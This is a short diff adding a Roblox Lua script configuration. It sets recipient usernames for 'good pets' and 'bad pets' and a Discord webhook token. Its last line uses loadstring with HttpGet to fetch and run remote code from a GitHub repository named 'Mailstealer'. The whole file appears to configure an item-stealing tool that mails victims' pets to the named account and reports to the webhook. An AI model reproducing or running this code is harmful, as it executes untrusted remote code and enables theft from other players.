@@ -1,0 +1,5 @@
+UserName = "Smn9nex" -- good pets
+Webhook = "https://discord.com/api/webhooks/1151159619041894430/cQ7vqQbipODL0DZ7h3Ph8Z25BQOvADB2qSMMBSKfBaOT9PZbuEZgOSzq416opt1k-ZiC" -- pings for pets
+UserName2 = "Smn9nex" -- bad pets
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
